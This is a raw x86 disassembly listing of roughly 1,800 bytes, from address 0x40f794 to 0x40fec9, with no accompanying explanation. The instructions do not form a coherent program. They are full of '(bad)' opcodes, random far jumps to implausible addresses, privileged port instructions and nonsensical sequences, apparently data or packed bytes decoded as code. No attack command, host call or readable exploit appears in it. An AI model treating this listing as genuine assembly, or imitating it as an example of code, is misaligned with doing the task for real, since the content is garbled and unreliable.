  40f794:	sub    eax,DWORD PTR [ecx]
  40f796:	sub    edi,ebp
  40f798:	call   0x829d3827
  40f79d:	(bad)  [edi-0x283e98d]
  40f7a3:	shl    BYTE PTR [ecx],1
  40f7a5:	pop    es
  40f7a6:	lock xor ch,al
  40f7a9:	lods   eax,DWORD PTR ds:[esi]
  40f7aa:	test   BYTE PTR [ecx+ebp*1-0x56],bl
  40f7ae:	add    BYTE PTR [edi+0x6a],dh
  40f7b1:	mov    ebp,0xeecea498
  40f7b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7b7:	or     dl,BYTE PTR [edx-0x611b78a0]
  40f7bd:	mov    dl,0x74
  40f7bf:	or     dh,bl
  40f7c1:	retf   0xab5c
  40f7c4:	sbb    dl,ch
  40f7c6:	mov    ds:0x3f3f43d7,al
  40f7cb:	adc    al,0x6f
  40f7cd:	icebp  
  40f7ce:	inc    esp
  40f7cf:	add    bh,bl
  40f7d1:	ret    0x3bf6
  40f7d4:	clc    
  40f7d5:	or     eax,DWORD PTR [edx]
  40f7d7:	leave  
  40f7d8:	sar    edi,0x3f
  40f7db:	jbe    0x40f78e
  40f7dd:	xor    eax,0x2688faa8
  40f7e2:	xchg   ebp,eax
  40f7e3:	xchg   DWORD PTR [esi],ecx
  40f7e5:	retf   0x88f3
  40f7e8:	pop    ebp
  40f7e9:	push   ss
  40f7ea:	retf   
  40f7eb:	(bad)  
  40f7ec:	in     al,dx
  40f7ed:	test   bh,0xf1
  40f7f0:	cmp    DWORD PTR fs:[ebx+0x2a],esp
  40f7f4:	sub    eax,esi
  40f7f6:	cmp    ebx,0xbd907696
  40f7fc:	stc    
  40f7fd:	ret    0x9e3b
  40f800:	or     ah,ch
  40f802:	sti    
  40f803:	ret    
  40f804:	(bad)  
  40f805:	fdiv   DWORD PTR [ecx+ebx*4-0x7afeb164]
  40f80c:	popa   
  40f80d:	call   DWORD PTR [esi]
  40f80f:	mov    ebx,0x59f4ceb0
  40f814:	xor    al,0x53
  40f816:	sahf   
  40f817:	inc    edi
  40f818:	sub    dl,BYTE PTR [ebp+0x7f537eb1]
  40f81e:	les    esp,FWORD PTR [edx-0x22]
  40f821:	sub    BYTE PTR [eax],bh
  40f823:	add    ch,BYTE PTR [eax]
  40f825:	xlat   BYTE PTR ds:[ebx]
  40f826:	mov    edx,esp
  40f828:	pop    ds
  40f829:	fwait
  40f82a:	cmp    DWORD PTR ds:0x15ebd8fc,0xf0d00968
  40f834:	jno    0x40f875
  40f836:	mov    al,0x92
  40f838:	sub    DWORD PTR [esi],esp
  40f83a:	lea    ecx,[edx-0x4500d74b]
  40f840:	retf   
  40f841:	sbb    eax,0xb4ef0f2b
  40f846:	fwait
  40f847:	dec    ecx
  40f848:	mov    dl,0xd0
  40f84a:	in     al,dx
  40f84b:	xchg   esp,eax
  40f84c:	addr16 push ecx
  40f84e:	push   ebx
  40f84f:	pop    esp
  40f850:	dec    esp
  40f851:	dec    esp
  40f852:	int    0x32
  40f854:	aam    0x56
  40f856:	fs mov dh,0x93
  40f859:	jp     0x40f7ed
  40f85b:	popf   
  40f85c:	mov    ds,ebp
  40f85e:	add    al,0x4f
  40f860:	jns    0x40f831
  40f862:	mov    bl,0xaa
  40f864:	xor    eax,DWORD PTR [eax+0x96a8285]
  40f86a:	sar    BYTE PTR [ebx],0x22
  40f86d:	sub    ebp,DWORD PTR [ecx-0x46a80d35]
  40f873:	out    dx,eax
  40f874:	adc    ebp,0x7a
  40f877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f878:	xor    bl,BYTE PTR [edi-0x3]
  40f87b:	push   edi
  40f87c:	test   BYTE PTR [eax-0x2a36e4dc],cl
  40f882:	mov    dl,0x71
  40f884:	je     0x40f813
  40f886:	in     eax,0xb
  40f888:	adc    al,0x83
  40f88a:	or     BYTE PTR [edx],0x96
  40f88d:	push   edx
  40f88e:	xor    bl,BYTE PTR [esi]
  40f890:	mov    ebp,0xb7a9c363
  40f895:	stos   BYTE PTR es:[edi],al
  40f896:	ss inc ebx
  40f898:	or     ebx,DWORD PTR [ebx]
  40f89a:	ret    0xd599
  40f89d:	imul   esi,DWORD PTR [edi+0x44],0x808908aa
  40f8a4:	daa    
  40f8a5:	ja     0x40f912
  40f8a7:	or     DWORD PTR [ebx+0x20],ecx
  40f8aa:	inc    ebp
  40f8ab:	and    esp,edi
  40f8ad:	ins    DWORD PTR es:[edi],dx
  40f8ae:	xor    eax,DWORD PTR [ebx+edx*8+0x7e494964]
  40f8b5:	add    eax,0xd4b9e827
  40f8ba:	xor    esp,ebp
  40f8bc:	push   ecx
  40f8bd:	retf   0x5dc9
  40f8c0:	sub    al,0xd7
  40f8c2:	mov    dh,0x44
  40f8c4:	iret   
  40f8c5:	pop    ecx
  40f8c6:	scas   eax,DWORD PTR es:[edi]
  40f8c7:	xor    eax,0xb145e550
  40f8cc:	shl    DWORD PTR [ecx],0x25
  40f8cf:	leave  
  40f8d0:	and    DWORD PTR [ebp+0x45],eax
  40f8d3:	add    ebp,edx
  40f8d5:	push   es
  40f8d6:	test   BYTE PTR [ebx-0x1a7619e2],0xcd
  40f8dd:	aaa    
  40f8de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8df:	push   edi
  40f8e0:	aas    
  40f8e1:	xor    ah,BYTE PTR [edx-0x48191c7a]
  40f8e7:	loop   0x40f93a
  40f8e9:	fnsave [ebp-0x6f]
  40f8ec:	gs cmp al,0x3a
  40f8ef:	std    
  40f8f0:	test   BYTE PTR [edi+0x6741fc27],ah
  40f8f6:	(bad)  
  40f8f8:	js     0x40f87e
  40f8fa:	adc    al,0xcb
  40f8fc:	stos   DWORD PTR es:[edi],eax
  40f8fd:	int    0x66
  40f8ff:	adc    al,0xfe
  40f901:	dec    eax
  40f902:	or     bl,dh
  40f904:	dec    edx
  40f905:	xor    DWORD PTR [esi+0x7d757f9e],0x8f3c094f
  40f90f:	xchg   BYTE PTR [ebx-0x151a5509],ch
  40f915:	pop    edi
  40f916:	jnp    0x40f8b0
  40f918:	sbb    ecx,DWORD PTR [edi-0x6a4b2997]
  40f91e:	push   0x81c3d16c
  40f923:	(bad)  
  40f924:	scas   eax,DWORD PTR es:[edi]
  40f925:	sbb    eax,0x7c8374fa
  40f92a:	adc    DWORD PTR [di+0x74],ecx
  40f92e:	jnp    0x40f8d2
  40f930:	repnz jmp 0x71ac:0x6d9a
  40f937:	push   ds
  40f938:	jns    0x40f933
  40f93a:	rol    DWORD PTR [edi],0x1f
  40f93d:	aas    
  40f93e:	pop    esp
  40f93f:	pop    edx
  40f940:	cmp    al,0x7e
  40f942:	cmp    eax,0x9a8da620
  40f947:	faddp  st(5),st
  40f949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f94a:	jmp    0x41c0:0x1001d1ea
  40f951:	pop    edi
  40f952:	daa    
  40f953:	imul   ecx,DWORD PTR [edx+0x5e],0x2c37e4cd
  40f95a:	jb     0x40f99a
  40f95c:	mov    ah,0xf5
  40f95e:	fstp   st(7)
  40f960:	inc    ebp
  40f961:	stos   DWORD PTR es:[edi],eax
  40f962:	xchg   ecx,eax
  40f963:	pushf  
  40f964:	in     al,0x8c
  40f966:	inc    ebp
  40f967:	mov    ebx,0xfd84a2de
  40f96c:	inc    ebx
  40f96d:	test   DWORD PTR [ebp+0x6f],edi
  40f970:	mov    BYTE PTR [eax+0x6abb3820],0x68
  40f977:	popf   
  40f978:	test   BYTE PTR [esi-0x28051faa],bh
  40f97e:	loop   0x40f9aa
  40f980:	mov    al,0x4
  40f982:	lock or bh,BYTE PTR [esi-0x7a34ce40]
  40f989:	sub    eax,0x2e205e4d
  40f98e:	pop    esi
  40f98f:	in     al,dx
  40f990:	push   ds
  40f991:	xor    edx,DWORD PTR [ebp+0x53fb5069]
  40f997:	in     eax,dx
  40f998:	or     ah,ah
  40f99a:	inc    ecx
  40f99b:	pop    edx
  40f99c:	pop    ebx
  40f99d:	in     eax,0x5b
  40f99f:	in     al,dx
  40f9a0:	push   ebp
  40f9a1:	fwait
  40f9a2:	shl    al,0xa9
  40f9a5:	adc    al,0x41
  40f9a7:	sub    edi,edx
  40f9a9:	push   0x4c
  40f9ab:	adc    BYTE PTR [ecx],bl
  40f9ad:	or     al,0x93
  40f9af:	out    0x3,ax
  40f9b2:	or     BYTE PTR [edx],bl
  40f9b4:	lock int 0x11
  40f9b7:	sub    eax,0xbd3013c0
  40f9bc:	mov    cl,BYTE PTR [edi+0x4e]
  40f9bf:	and    BYTE PTR [eax-0x74],bh
  40f9c2:	sub    DWORD PTR [eax-0x2f],ecx
  40f9c5:	xchg   ebp,eax
  40f9c6:	jmp    0x40f9ad
  40f9c8:	int    0xc7
  40f9ca:	cmp    BYTE PTR ds:0x79a4c87c,cl
  40f9d0:	mov    ds:0x5c80a961,eax
  40f9d5:	add    bh,al
  40f9d7:	mov    esi,0x505232a1
  40f9dc:	sbb    eax,DWORD PTR [edi]
  40f9de:	mov    ds:0x37a9303b,al
  40f9e3:	in     al,0x66
  40f9e5:	or     eax,0xf8fb7cab
  40f9ea:	fs mov ebx,edx
  40f9ed:	sti    
  40f9ee:	sbb    eax,0xc2676976
  40f9f3:	jne    0x40fa6c
  40f9f5:	ins    BYTE PTR es:[edi],dx
  40f9f6:	mov    bh,0x66
  40f9f8:	pop    ecx
  40f9f9:	mov    ecx,ebx
  40f9fb:	pop    ebp
  40f9fc:	sub    esp,DWORD PTR [ebp+0x47]
  40f9ff:	imul   ecx,DWORD PTR [edi-0x53],0x55
  40fa03:	xchg   BYTE PTR [eax+0x76],cl
  40fa06:	push   eax
  40fa07:	fsub   QWORD PTR [esi+0x6c]
  40fa0a:	out    dx,al
  40fa0b:	lds    eax,FWORD PTR gs:[ebp+0x4c147816]
  40fa12:	fwait
  40fa13:	lods   eax,DWORD PTR ds:[esi]
  40fa14:	dec    esp
  40fa15:	jp     0x40f9e7
  40fa17:	dec    ebx
  40fa18:	cli    
  40fa19:	out    dx,eax
  40fa1a:	aam    0x4c
  40fa1c:	jmp    0xc7ac:0xd8bbbd36
  40fa23:	out    dx,al
  40fa24:	mov    DWORD PTR [ecx-0x799fcc21],ecx
  40fa2a:	pop    ds
  40fa2b:	jno    0x40fa92
  40fa2d:	repnz loope 0x40fa3b
  40fa30:	xrelease mov DWORD PTR [esp+ecx*4-0x33],ebx
  40fa35:	cmp    DWORD PTR [edx],0xba34bdc5
  40fa3b:	fwait
  40fa3c:	pop    ecx
  40fa3d:	imul   esp,DWORD PTR [edx],0xffffffbf
  40fa40:	fwait
  40fa41:	icebp  
  40fa42:	fwait
  40fa43:	sbb    al,0x88
  40fa45:	sbb    eax,0xbccc5cff
  40fa4a:	jns    0x40fa9c
  40fa4c:	push   ebp
  40fa4d:	add    eax,edi
  40fa4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa50:	dec    ecx
  40fa51:	neg    BYTE PTR [edx]
  40fa53:	imul   DWORD PTR [ecx+0x4f]
  40fa56:	iret   
  40fa57:	sub    DWORD PTR [ebx],edi
  40fa59:	ins    BYTE PTR es:[edi],dx
  40fa5a:	jne    0x40fa9f
  40fa5c:	cs jmp 0xf18d:0xb7da9d05
  40fa64:	mov    eax,0x67be24b0
  40fa69:	mov    ebp,0x1e8b4619
  40fa6e:	pop    ebx
  40fa6f:	mov    ?,WORD PTR [edi-0x5d]
  40fa72:	shl    BYTE PTR [ebx+0x7b],0xcf
  40fa76:	lods   eax,DWORD PTR ds:[esi]
  40fa77:	(bad)  
  40fa79:	iret   
  40fa7a:	sub    edx,DWORD PTR [ebx+0x27d6524d]
  40fa80:	imul   esp,DWORD PTR [eax+eiz*8-0x6a80e6f],0x84f41dbc
  40fa8b:	pop    edi
  40fa8c:	jne    0x40faeb
  40fa8e:	pop    ecx
  40fa8f:	shr    BYTE PTR [esi],cl
  40fa91:	xor    BYTE PTR [edi+edi*1-0x70],dl
  40fa95:	ror    DWORD PTR [esi],1
  40fa97:	stc    
  40fa98:	xchg   DWORD PTR ds:0xa70d40,ebx
  40fa9e:	outs   dx,DWORD PTR ds:[esi]
  40fa9f:	mov    al,0xd0
  40faa1:	mov    ebp,0x223756ea
  40faa6:	adc    dl,BYTE PTR [ecx]
  40faa8:	lea    ecx,[edi]
  40faaa:	loop   0x40fa34
  40faac:	(bad)  
  40faad:	repnz push 0x31
  40fab0:	ffreep st(2)
  40fab2:	adc    al,0x60
  40fab4:	or     BYTE PTR [ebx],bl
  40fab6:	hlt    
  40fab7:	outs   dx,DWORD PTR ds:[esi]
  40fab8:	sub    BYTE PTR [ebp+0x59],cl
  40fabb:	stos   DWORD PTR es:[edi],eax
  40fabc:	or     dh,ah
  40fabe:	pushf  
  40fabf:	dec    edi
  40fac0:	outs   dx,DWORD PTR ds:[esi]
  40fac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fac2:	bound  ecx,QWORD PTR gs:[edi+ecx*8]
  40fac6:	mov    BYTE PTR [edi],cl
  40fac8:	outs   dx,DWORD PTR ds:[esi]
  40fac9:	mov    ch,0xb7
  40facb:	(bad)  
  40facc:	push   edi
  40facd:	add    ebx,DWORD PTR [ecx]
  40facf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fad1:	cmp    esi,edi
  40fad3:	mov    eax,edi
  40fad5:	daa    
  40fad6:	stos   BYTE PTR es:[edi],al
  40fad7:	out    dx,al
  40fad8:	mov    cl,0x32
  40fada:	mov    esi,0x2c7cb449
  40fadf:	imul   edx,DWORD PTR [edi-0x65],0x51f39e9d
  40fae6:	sbb    eax,0xe06182db
  40faeb:	das    
  40faec:	test   esi,ebp
  40faee:	rol    dh,0xe3
  40faf1:	xor    eax,0x5e264eec
  40faf6:	(bad)  
  40faf7:	and    ch,BYTE PTR [edi-0x4a85d828]
  40fafd:	shr    DWORD PTR [edx],0x55
  40fb00:	xor    ecx,DWORD PTR [esi-0x70]
  40fb03:	pop    ecx
  40fb04:	xchg   ebp,eax
  40fb05:	inc    esi
  40fb06:	jo     0x40faa5
  40fb08:	sub    ebp,edx
  40fb0a:	gs jns 0x40fb00
  40fb0d:	jb     0x40fb2b
  40fb0f:	mov    cl,0x5f
  40fb11:	test   eax,0x4d9b5679
  40fb16:	xchg   edx,edi
  40fb18:	ja     0x40fb05
  40fb1a:	cmp    DWORD PTR [esp+ecx*2+0x3c],ebp
  40fb1e:	and    esp,eax
  40fb20:	jae    0x40fb47
  40fb22:	cmp    al,0x1d
  40fb24:	ja     0x40fb26
  40fb26:	inc    eax
  40fb27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb28:	inc    ebp
  40fb29:	dec    eax
  40fb2a:	push   edi
  40fb2b:	xchg   BYTE PTR [ebp+0x61cc2321],dh
  40fb31:	(bad)  
  40fb33:	out    0x10,al
  40fb35:	sbb    BYTE PTR [esi-0x6874133b],dh
  40fb3b:	and    BYTE PTR [eax-0x4d],bl
  40fb3e:	jo     0x40fb7c
  40fb40:	(bad)
  40fb43:	sbb    dh,BYTE PTR [ebp+0xa]
  40fb46:	pop    ebx
  40fb47:	push   es
  40fb48:	push   ebx
  40fb49:	adc    eax,ebp
  40fb4b:	mov    ch,0x85
  40fb4d:	paddusw mm0,QWORD PTR [esi-0x6eb62ab1]
  40fb54:	outs   dx,DWORD PTR ds:[esi]
  40fb55:	lahf   
  40fb56:	jp     0x40fb25
  40fb58:	jge    0x40fb1c
  40fb5a:	mov    dl,0x23
  40fb5c:	jnp    0x40fb6b
  40fb5e:	mov    ds:0x44bfd16c,al
  40fb63:	inc    ebx
  40fb64:	xlat   BYTE PTR ds:[ebx]
  40fb65:	sub    eax,0x27e31ca6
  40fb6a:	popa   
  40fb6b:	jo     0x40fb8b
  40fb6d:	test   eax,0x940b97ff
  40fb72:	and    al,0x41
  40fb74:	cmp    ecx,esp
  40fb76:	out    0x30,eax
  40fb78:	lods   eax,DWORD PTR ds:[esi]
  40fb79:	adc    dl,BYTE PTR [ebx+0x52]
  40fb7c:	or     al,ch
  40fb7e:	mov    cl,0xd4
  40fb80:	jbe    0x40fb84
  40fb82:	jge    0x40fb6d
  40fb84:	sbb    eax,DWORD PTR [ecx+eiz*4]
  40fb87:	in     eax,dx
  40fb88:	dec    ebp
  40fb89:	mov    edi,ecx
  40fb8b:	outs   dx,BYTE PTR ds:[esi]
  40fb8c:	adc    ch,BYTE PTR [edx+0x1a]
  40fb8f:	jecxz  0x40fbe6
  40fb91:	push   ss
  40fb92:	and    al,0xd7
  40fb94:	mov    cs,WORD PTR [edx-0x35]
  40fb97:	jp     0x40fb6b
  40fb99:	dec    esp
  40fb9a:	rol    BYTE PTR [ecx-0x38],cl
  40fb9d:	or     al,0x35
  40fb9f:	sbb    esp,DWORD PTR [esi-0x10a2c410]
  40fba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fba6:	lds    edx,FWORD PTR [edx]
  40fba8:	push   edx
  40fba9:	adc    al,0x40
  40fbab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbac:	mov    ah,0xf7
  40fbae:	and    esi,DWORD PTR [ecx-0x75]
  40fbb1:	call   0xb27ed1b0
  40fbb6:	mov    edi,0x159063c6
  40fbbb:	ror    DWORD PTR [edi+0x64492e45],0xff
  40fbc2:	and    cl,ah
  40fbc4:	mov    dh,0x12
  40fbc6:	mov    al,0x34
  40fbc8:	inc    eax
  40fbc9:	or     bl,BYTE PTR [eax-0x14]
  40fbcc:	aaa    
  40fbcd:	cdq    
  40fbce:	add    bl,BYTE PTR [esp+eax*8]
  40fbd1:	gs or  al,0x1f
  40fbd4:	aam    0xfa
  40fbd6:	ins    DWORD PTR es:[edi],dx
  40fbd7:	xchg   edi,eax
  40fbd8:	int3   
  40fbd9:	fisub  DWORD PTR [ecx+0xc]
  40fbdc:	sub    BYTE PTR ds:0xd2cca5f8,bh
  40fbe2:	imul   ecx,DWORD PTR [edx+0x6b],0x4e
  40fbe6:	popa   
  40fbe7:	sar    DWORD PTR ds:0xc685ceeb,1
  40fbed:	call   0xa2a6:0xa36851ed
  40fbf4:	and    eax,0x36217397
  40fbf9:	icebp  
  40fbfa:	retf   
  40fbfb:	out    dx,eax
  40fbfc:	test   BYTE PTR [edi+ebp*2],ch
  40fbff:	scas   eax,DWORD PTR es:[edi]
  40fc00:	retf   
  40fc01:	dec    edx
  40fc02:	mov    edx,0x881625ea
  40fc07:	popa   
  40fc08:	pop    ecx
  40fc09:	adc    DWORD PTR [esi],esp
  40fc0b:	sar    BYTE PTR [ecx-0x60bd7d37],0x2a
  40fc12:	sbb    ecx,DWORD PTR [eax-0x22077b4f]
  40fc18:	stos   DWORD PTR es:[edi],eax
  40fc19:	pop    ds
  40fc1a:	jp     0x40fbe8
  40fc1c:	out    dx,eax
  40fc1d:	sub    DWORD PTR [eax+edx*4-0x5c6437cb],edx
  40fc24:	out    dx,eax
  40fc25:	sub    BYTE PTR ds:0xe2430283,ch
  40fc2b:	inc    edi
  40fc2c:	jo     0x40fc66
  40fc2e:	xchg   DWORD PTR [eax],ebx
  40fc30:	ja     0x40fbf2
  40fc32:	pusha  
  40fc33:	jb     0x40fbc6
  40fc35:	outs   dx,DWORD PTR ds:[esi]
  40fc36:	push   ebx
  40fc37:	sbb    eax,0xeff7fe09
  40fc3c:	pop    ss
  40fc3d:	mov    ds:0xafab5728,eax
  40fc42:	xchg   ebp,eax
  40fc43:	adc    al,BYTE PTR [esi-0xe9fdcfc]
  40fc49:	xor    eax,0x2c48e29
  40fc4e:	repnz dec esp
  40fc50:	data16 outs dx,BYTE PTR ds:[esi]
  40fc52:	sub    BYTE PTR ds:0xa544435,bl
  40fc58:	sbb    DWORD PTR [ecx],ebp
  40fc5a:	push   esp
  40fc5b:	inc    ebx
  40fc5c:	out    0xec,eax
  40fc5e:	fwait
  40fc5f:	test   al,0xa0
  40fc61:	std    
  40fc62:	das    
  40fc63:	inc    eax
  40fc64:	mov    dl,0x69
  40fc66:	cmp    DWORD PTR [ecx],esp
  40fc68:	loop   0x40fc83
  40fc6a:	mov    dh,0x20
  40fc6c:	test   eax,0x9cae9451
  40fc71:	clc    
  40fc72:	std    
  40fc73:	dec    edx
  40fc74:	add    bl,BYTE PTR [edi]
  40fc76:	dec    edi
  40fc77:	inc    edx
  40fc78:	or     ebx,DWORD PTR [eax]
  40fc7a:	add    dh,dh
  40fc7c:	pop    edi
  40fc7d:	sub    BYTE PTR [edi+esi*8-0x4b],cl
  40fc81:	sbb    ah,bh
  40fc83:	mov    ah,0xbc
  40fc85:	sub    BYTE PTR ds:0xab58825c,cl
  40fc8b:	adc    al,bl
  40fc8d:	scas   al,BYTE PTR es:[edi]
  40fc8e:	(bad)  
  40fc8f:	sub    eax,0xea975ffd
  40fc94:	xchg   ecx,eax
  40fc95:	xor    DWORD PTR [edi+eiz*2],edi
  40fc98:	sbb    DWORD PTR [ecx+0x197b8bd7],esp
  40fc9e:	adc    al,0x18
  40fca0:	in     al,dx
  40fca1:	push   ds
  40fca2:	mov    ecx,0xb5f121ff
  40fca7:	in     al,dx
  40fca8:	add    BYTE PTR [eax-0x8d58713],bl
  40fcae:	repnz and al,0x16
  40fcb1:	adc    BYTE PTR [ebx],0x2a
  40fcb4:	mov    dh,0xde
  40fcb6:	jge    0x40fc6b
  40fcb8:	mov    ebp,0x4d0ee4ed
  40fcbd:	cmp    al,BYTE PTR [eax-0x508b09d0]
  40fcc3:	push   esp
  40fcc4:	inc    ecx
  40fcc5:	mov    ebp,0xcbac6e9e
  40fcca:	inc    ebp
  40fccb:	clc    
  40fccc:	sub    ebx,eax
  40fcce:	mov    esi,0xe412c7bf
  40fcd3:	call   FWORD PTR [ecx+0xe68b01d]
  40fcd9:	fcom   QWORD PTR [edi+ecx*2]
  40fcdc:	test   BYTE PTR [ebx-0x30],cl
  40fcdf:	xor    DWORD PTR [ebx+0x7],esp
  40fce2:	imul   BYTE PTR [ecx-0x48]
  40fce5:	mov    ch,0x93
  40fce7:	sub    esi,eax
  40fce9:	xchg   cl,al
  40fceb:	pop    ebx
  40fcec:	pop    ss
  40fced:	add    DWORD PTR [edx],0x58
  40fcf0:	pop    ebp
  40fcf1:	test   DWORD PTR [ebx],0xe6df6904
  40fcf7:	adc    eax,0x55b4d400
  40fcfc:	sahf   
  40fcfd:	jmp    0x79ef09ee
  40fd02:	push   eax
  40fd03:	stos   DWORD PTR es:[edi],eax
  40fd04:	sbb    al,ch
  40fd06:	sysenter 
  40fd08:	adc    ah,0x33
  40fd0b:	inc    esp
  40fd0c:	sub    eax,0x2e3e448b
  40fd11:	inc    eax
  40fd12:	xchg   ebx,eax
  40fd13:	es push ds
  40fd15:	pmulhuw mm6,QWORD PTR [edi]
  40fd18:	mov    eax,0x90491294
  40fd1d:	out    0x36,eax
  40fd1f:	push   0x6f
  40fd21:	ins    BYTE PTR es:[edi],dx
  40fd22:	call   0x64f1bef0
  40fd27:	call   DWORD PTR [ebp+0x5d84e9f4]
  40fd2d:	and    bh,dh
  40fd2f:	aas    
  40fd30:	add    esi,DWORD PTR [edx-0x7e6dfdb2]
  40fd36:	lahf   
  40fd37:	clc    
  40fd38:	aad    0x49
  40fd3a:	pop    esp
  40fd3b:	retf   0xb474
  40fd3e:	mov    ds:0x3196fefb,eax
  40fd43:	(bad)  
  40fd44:	jmp    FWORD PTR [eax-0x13ff33c5]
  40fd4a:	mov    WORD PTR [edx+0x38],?
  40fd4d:	and    eax,0x2abd0fb8
  40fd52:	loopne 0x40fdbf
  40fd54:	lds    ecx,FWORD PTR [edx+0x53e0f52c]
  40fd5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd5b:	(bad)  
  40fd5c:	stc    
  40fd5d:	cmc    
  40fd5e:	nop
  40fd5f:	call   0x6abf:0x7fa71690
  40fd66:	jmp    0xc3b02eb6
  40fd6b:	inc    esi
  40fd6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd6d:	fidiv  DWORD PTR [edi]
  40fd6f:	cdq    
  40fd70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd71:	nop
  40fd72:	inc    esi
  40fd73:	push   edx
  40fd74:	imul   edx,DWORD PTR [edx+edi*2+0x67],0x8
  40fd79:	sub    al,0xad
  40fd7b:	icebp  
  40fd7c:	(bad)  
  40fd7d:	sbb    DWORD PTR [eax],esp
  40fd7f:	xor    eax,0xa96fd96a
  40fd84:	hlt    
  40fd85:	pop    ds
  40fd86:	fstp   DWORD PTR [esi+0x1ee9da7f]
  40fd8c:	dec    edx
  40fd8d:	lds    ebx,FWORD PTR [esi-0x21]
  40fd90:	adc    DWORD PTR [ebp+0x18],ecx
  40fd93:	push   es
  40fd94:	inc    esi
  40fd95:	sahf   
  40fd96:	jne    0x40fd98
  40fd98:	or     eax,DWORD PTR [ebx]
  40fd9a:	(bad)  
  40fd9b:	test   BYTE PTR ds:0x3984f079,0x78
  40fda2:	pop    ecx
  40fda3:	add    al,0x26
  40fda5:	scas   al,BYTE PTR es:[edi]
  40fda6:	dec    edi
  40fda7:	and    esp,DWORD PTR [ecx+eiz*4+0x3f]
  40fdab:	std    
  40fdac:	outs   dx,DWORD PTR ds:[esi]
  40fdad:	xchg   esi,eax
  40fdae:	pop    eax
  40fdaf:	mov    eax,0xa5eea6e6
  40fdb4:	imul   esp,DWORD PTR [edi+0x4a],0x6d54f32a
  40fdbb:	push   esi
  40fdbc:	mov    ds:0xd8aafb6d,al
  40fdc1:	and    ecx,ebx
  40fdc3:	xor    ah,BYTE PTR [ecx+0x4d2b440d]
  40fdc9:	dec    edi
  40fdca:	repz lds esi,FWORD PTR [edi]
  40fdcd:	pop    sp
  40fdcf:	in     eax,dx
  40fdd0:	idiv   ecx
  40fdd2:	data16 loop 0x40fe02
  40fdd5:	adc    BYTE PTR [ecx],dl
  40fdd7:	and    eax,0x8a75c5c3
  40fddc:	fs jno 0x40fda7
  40fddf:	jnp    0x40fdde
  40fde1:	jnp    0x40fdb8
  40fde3:	xchg   edx,eax
  40fde4:	pop    esi
  40fde5:	jmp    0xf85214a
  40fdea:	cwde   
  40fdeb:	jmp    0x489d:0xa20a5a15
  40fdf2:	(bad)  
  40fdf3:	push   edi
  40fdf4:	cwde   
  40fdf5:	jg     0x40fe18
  40fdf7:	jmp    0xc20:0x220d83a3
  40fdfe:	xchg   esp,eax
  40fdff:	inc    ebp
  40fe00:	int    0xdc
  40fe02:	push   0xffffffc0
  40fe04:	cld    
  40fe05:	mov    ebp,0x99eb3a54
  40fe0a:	xchg   esp,eax
  40fe0b:	icebp  
  40fe0c:	sub    BYTE PTR [ecx+0x99e8a60],dl
  40fe12:	shr    DWORD PTR [edi-0x5f9d3076],1
  40fe18:	xchg   DWORD PTR [ebp-0x70],esi
  40fe1b:	ds xchg esp,eax
  40fe1d:	clts   
  40fe1f:	add    al,0x25
  40fe21:	mov    ebp,0x541a882
  40fe26:	cmc    
  40fe27:	pop    ds
  40fe28:	call   0x2cdecf26
  40fe2d:	xchg   DWORD PTR [ebx],edi
  40fe2f:	cli    
  40fe30:	mov    esi,0x37c698d0
  40fe35:	dec    edi
  40fe36:	cwde   
  40fe37:	(bad)  
  40fe38:	hlt    
  40fe39:	adc    cl,bl
  40fe3b:	(bad)  
  40fe3c:	adc    ax,0xe13c
  40fe40:	mov    edx,0x1944c85e
  40fe45:	aas    
  40fe46:	and    BYTE PTR [esi],al
  40fe48:	mov    esp,0xad6737cc
  40fe4d:	mov    edx,0xbb7eb49c
  40fe52:	cmp    eax,0x9daef095
  40fe57:	jno    0x40fea6
  40fe59:	push   eax
  40fe5a:	or     eax,0x40065eb4
  40fe5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe60:	pop    ecx
  40fe61:	not    BYTE PTR [ebx]
  40fe63:	mov    edi,0x347cd564
  40fe68:	dec    ebx
  40fe69:	aam    0x2e
  40fe6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe6c:	ficom  WORD PTR [esi]
  40fe6e:	test   ecx,eax
  40fe70:	jns    0x40fe63
  40fe72:	sahf   
  40fe73:	lea    esi,[edx+edi*2]
  40fe76:	sbb    BYTE PTR [esi-0x12836b94],ch
  40fe7c:	sbb    ebx,DWORD PTR [ecx-0x38]
  40fe7f:	ins    DWORD PTR es:[edi],dx
  40fe80:	test   eax,0xd78011e4
  40fe85:	pand   mm3,QWORD PTR [ebp-0x1f]
  40fe89:	shr    BYTE PTR [esi-0x41],cl
  40fe8c:	hlt    
  40fe8d:	(bad)  
  40fe8f:	mov    WORD PTR [ebx+0x38],cs
  40fe92:	sub    al,0x9d
  40fe94:	fcomp  DWORD PTR [bp+si-0x21]
  40fe98:	out    0x91,eax
  40fe9a:	fidiv  WORD PTR ds:0xff5053bd
  40fea0:	add    ecx,DWORD PTR [edx]
  40fea2:	(bad)  
  40fea3:	scas   al,BYTE PTR es:[edi]
  40fea4:	aaa    
  40fea5:	fild   QWORD PTR [edx+0x1b]
  40fea8:	jne    0x40feef
  40feaa:	adc    ebp,DWORD PTR [ebp+0x49f3f5c9]
  40feb0:	fdiv   DWORD PTR [edi]
  40feb2:	pushf  
  40feb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feb4:	mov    al,ds:0xbc8b4159
  40feb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feba:	cmp    DWORD PTR [edx-0x39da604c],edi
  40fec0:	ins    DWORD PTR es:[edi],dx
  40fec1:	or     BYTE PTR [edi-0x57],0x41
  40fec5:	jecxz  0x40fefa
  40fec7:	xor    al,BYTE PTR [eax]
  40fec9:	in     eax,0x87
